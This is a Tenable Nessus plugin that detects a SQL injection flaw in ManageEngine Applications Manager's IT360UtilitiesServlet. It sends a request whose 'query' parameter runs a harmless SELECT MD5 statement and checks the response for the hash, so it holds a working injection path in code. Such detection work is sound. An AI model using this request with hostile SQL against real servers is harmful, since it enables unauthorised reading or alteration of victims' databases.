#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(84242);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/06/18 13:42:57 $");

  script_bugtraq_id(74692);
  script_osvdb_id(122203);

  script_name(english:"ManageEngine Applications Manager IT360UtilitiesServlet SQLi");
  script_summary(english:"Attempts to exploit SQL injection vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application is affected by a SQL injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of ManageEngine Applications
Manager that is affected by a SQL injection vulnerability due to
improper validation of user-supplied input to the
'IT360UtilitiesServlet' servlet. A remote attacker can exploit this
flaw to execute arbitrary SQL statements.

Note that some third-party resources indicate that a patch exists for
this vulnerability in the 11.x version branch. However, Tenable
Research has successfully exploited this vulnerability in the latest
available software release for this branch.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-230/");
  script_set_attribute(attribute:"solution", value:"
Upgrade to ManageEngine Applications Manager version 12 or later, as
it does not ship with the affected script.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date",value:"2015/05/15");
  script_set_attribute(attribute:"patch_publication_date",value:"2015/04/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/06/17");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:manageengine:applications_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_applications_manager_detect.nasl");
  script_require_keys("installed_sw/ManageEngine Applications Manager");
  script_require_ports("Services/www", 9090);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "ManageEngine Applications Manager";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:9090);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
dir = dir - "/index.do";

install_url = build_url(port:port, qs:dir);

test_str = rand_str();
test_str_md5 = hexstr(MD5(test_str));

exploit = dir + '/servlets/IT360UtilitiesServlet?' +
          'action=getValueFromAPMDB&' +
          'query=SELECT%20MD5%28%27' + test_str + '%27%29';

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : exploit,
  exit_on_fail : TRUE
);

if(test_str_md5 >!< tolower(res[2]))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  request     : make_list(build_url(port:port, qs:exploit)),
  output      : chomp(res[2]),
  sqli        : TRUE,
  generic     : TRUE
);
exit(0);
